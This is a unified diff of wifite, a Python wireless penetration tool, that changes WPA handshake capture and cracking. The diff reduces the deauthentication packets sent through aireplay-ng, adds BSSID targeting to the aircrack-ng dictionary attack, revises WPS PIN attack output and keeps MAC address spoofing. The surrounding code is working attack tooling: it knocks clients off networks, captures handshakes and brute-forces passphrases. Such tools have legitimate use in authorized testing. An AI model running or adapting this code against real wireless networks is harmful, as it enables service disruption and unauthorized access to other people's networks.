@@ -71,12 +71,12 @@ WPA_HANDSHAKE_DIR    = 'hs' # Directory in which handshakes .cap files are store
 if WPA_HANDSHAKE_DIR[-1] == os.sep: WPA_HANDSHAKE_DIR = WPA_HANDSHAKE_DIR[:-1]
 WPA_FINDINGS         = [] # List of strings containing info on successful WPA attacks
 WPA_DONT_CRACK       = False # Flag to skip cracking of handshakes
-WPA_DICTIONARY       = '/pentest/web/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
+WPA_DICTIONARY       = 'phpbb.txt' # '/pentest/web/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
 if not os.path.exists(WPA_DICTIONARY): WPA_DICTIONARY = ''
 # Various programs to use when checking for a four-way handshake.
 # True means the program must find a valid handshake in order for wifite to recognize a handshake.
 WPA_HANDSHAKE_TSHARK   = False #True # Checks for sequential 1/4, 2/4, 3/4 EAPOL packets (ignores 4th)
-WPA_HANDSHAKE_PYRIT    = False #True # Sometimes crashes on incomplete dumps, but accurate.
+WPA_HANDSHAKE_PYRIT    = True #True # Sometimes crashes on incomplete dumps, but accurate.
 WPA_HANDSHAKE_AIRCRACK = True  # Not 100% accurate, but fast.
 WPA_HANDSHAKE_COWPATTY = False #True # Uses more lenient "nonstrict mode" (-2)
 
@@ -395,13 +395,13 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 					y = int(sy) + 1
 					for v in xrange(x, y):
 						victims.append(targets[v - 1])
-			elif not r.isdigit():
-				print R+"[!]"+O+" not a number: %s " % (O+r+W)
+			elif not r.isdigit() and r.strip() != '':
+				print R+" [!]"+O+" not a number: %s " % (O+r+W)
 			else:
 				victims.append(targets[int(r) - 1])
 		
 	if len(victims) == 0:
-		print O+' [!] '+R+'no targets selected.'
+		print O+' [!] '+R+'no targets selected.'+W
 		exit_gracefully(0)
 	
 	print ''
@@ -849,17 +849,17 @@ def wpa_get_handshake(iface, target, clients):
 				# Send deauth packets via aireplay-ng
 				cmd = ['aireplay-ng', 
 				      '-0',  # Attack method (Deauthentication)
-				       '3',  # Number of packets to send
+				       '1',  # Number of packets to send
 				      '-a', target.bssid]
 				
 				client_index += 1
 				
 				if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
-					print " %s sending 3 deauth to %s*broadcast*%s..." % \
+					print " %s sending 1 deauth to %s*broadcast*%s..." % \
 					         (sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running), G, W),
 					client_index = -1
 				else:
-					print " %s sending 3 deauths to %s... " % \
+					print " %s sending 1 deauth to %s... " % \
 					         (sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running), \
 					         G+target_clients[client_index].bssid+W),
 					cmd.append('-h')
@@ -877,7 +877,7 @@ def wpa_get_handshake(iface, target, clients):
 			if not os.path.exists(temp + 'wpa-01.cap'): continue
 			copy(temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp')
 			
-			# Save copy of cap file
+			# Save copy of cap file (for debugging)
 			#remove_file('/root/new/wpa-01.cap')
 			#copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')
 			
@@ -1424,12 +1424,28 @@ def main():
 	
 		caps = len(WPA_CAPS_TO_CRACK)
 		if caps > 0 and not WPA_DONT_CRACK:
-			print ' beginning WPA crack on %d handshake%s' % (caps, '' if caps == 1 else 's')
+			print '[+] beginning '+G+'WPA crack'+W+' on %s%d handshake%s' % (G, caps, W if caps == 1 else 's'+W)
 			for cap in WPA_CAPS_TO_CRACK:
 				wpa_crack(cap)
 	
 	print ''
 	exit_gracefully(0)
+
+
+def add_commas(n):
+	"""
+		Receives integer n, returns string representation of n with commas in thousands place.
+		I'm sure there's easier ways of doing this... but meh.
+	"""
+	strn = str(n)
+	lenn = len(strn)
+	i = 0
+	result = ''
+	while i < lenn:
+		if (lenn - i) % 3 == 0 and i != 0: result += ','
+		result += strn[i]
+		i += 1
+	return result
 
 
 def wpa_crack(capfile):
@@ -1438,7 +1454,7 @@ def wpa_crack(capfile):
 		This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
 		they can do so manually.
 	"""
-	print ' [0:00:00] cracking %s with %s' % (G+capfile.ssid+W, G+'aircrack-ng'+W)
+	print GR+' [0:00:00]'+W+' cracking %s with %s' % (G+capfile.ssid+W, G+'aircrack-ng'+W)
 	start_time = time.time()
 	cracked = False
 	
@@ -1449,8 +1465,9 @@ def wpa_crack(capfile):
 	       '-a', '2',                 # WPA crack
 	       '-w', WPA_DICTIONARY,      # Wordlist
 	       '-l', temp + 'wpakey.txt', # Save key to file
+	       '-b', capfile.bssid,       # BSSID of target
 	       capfile.filename]
-	print ' '.join(cmd)
+	
 	proc = Popen(cmd, stdout=open(temp + 'out.out', 'a'), stderr=DN)
 	try:
 		kt  = 0 # Keys tested
@@ -1465,11 +1482,12 @@ def wpa_crack(capfile):
 					key = inf.read().strip()
 					inf.close()
 					WPA_FINDINGS.append('cracked wpa key for "%s" (%s): "%s"' % (G+capfile.ssid+W, G+capfile.bssid+W, C+key+W))
-					print '\n [+] cracked %s (%s): "%s"\n' % (G+capfile.ssid+W, G+capfile.bssid+W, C+key+W)
+					print GR+'\n [+]'+W+' cracked %s (%s)!' % (G+capfile.ssid+W, G+capfile.bssid+W)
+					print GR+' [+]'+W+' key:    "%s"\n' % (C+key+W)
 					cracked = True
 				else:
 					# Did not crack
-					print '\n [+] crack attempt '+R+'failed'+W+''
+					print R+'\n [!]'+W+' crack attempt '+R+'failed'+W+': passphrase not in dictionary\n'
 				break
 			
 			inf = open(temp + 'out.out', 'r')
@@ -1491,8 +1509,8 @@ def wpa_crack(capfile):
 					try: kps = float(kpss)
 					except ValueError: pass
 			
-			print "\r %s keys tested: %d (%.2f keys/sec)   " % \
-			             (sec_to_hms(time.time() - start_time), kt, kps),
+			print "\r %s %s keys tested (%s%.2f keys/sec%s)   " % \
+			       (GR+sec_to_hms(time.time() - start_time)+W, G+add_commas(kt)+W, G, kps, W),
 			stdout.flush()
 			
 	except KeyboardInterrupt: print R+'\n (^C)'+O+' WPA cracking interrupted'+W
@@ -1565,8 +1583,8 @@ def wps_attack(iface, target):
 						key = line[14:-1]
 						cracked = True
 				
-				if pin != '': print '\n\n [+] PIN found:     %s' % (G+pin+W)
-				if key != '': print ' [+] %sWPA key found%s: "%s"' % (G, W, C+key+W)
+				if pin != '': print GR+'\n\n [+]'+W+' PIN found:     %s' % (G+pin+W)
+				if key != '': print GR+' [+] %sWPA key found%s: "%s"' % (G, W, C+key+W)
 				break
 		
 		if cracked:
@@ -1615,7 +1633,7 @@ def mac_anonymize(iface):
 	
 	call(['ifconfig', iface, 'down'])
 	
-	print " [+] changing %s's MAC from %s to %s..." % (G+iface+W, G+old_mac+W, O+new_mac+W),
+	print GR+" [+]"+W+" changing %s's MAC from %s to %s..." % (G+iface+W, G+old_mac+W, O+new_mac+W),
 	stdout.flush()
 	
 	proc = Popen(['ifconfig', iface, 'hw', 'ether', new_mac], stdout=PIPE, stderr=DN)
@@ -1631,7 +1649,7 @@ def mac_change_back():
 	old_mac = ORIGINAL_IFACE_MAC[1]
 	if iface == '' or old_mac == '': return
 	
-	print " [+] changing %s's mac back to %s..." % (G+iface+W, G+old_mac+W),
+	print GR+" [+]"+W+" changing %s's mac back to %s..." % (G+iface+W, G+old_mac+W),
 	stdout.flush()
 	
 	call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
@@ -1654,15 +1672,11 @@ def exit_gracefully(code):
 	disable_monitor_mode()
 	# Change MAC address back if spoofed
 	mac_change_back()
-	print W+" [+] quitting" # wifite will now exit"
+	print GR+" [+]"+W+" quitting" # wifite will now exit"
 	# GTFO
 	exit(code)
 
-#t = Target('c0:c1:c0:07:54:dc', '1', '1', '6', 'WPA', 'Killfuck Soulshitter')
-#print has_handshake(t, 'wpa-01.cap')
-#exit_gracefully(1)
-
-#c = CapFile('wpa-01.cap', 'Killfuck Soulshitter', 'c0:c1:c0:07:54:dc')
+#c = CapFile('hs/KillfuckSoulshitter_C0-C1-C0-07-54-DC_2.cap', 'Killfuck Soulshitter', 'c0:c1:c0:07:54:dc')
 #WPA_CRACKER = 'aircrack'
 #cracked = wpa_crack(c)
 #print cracked
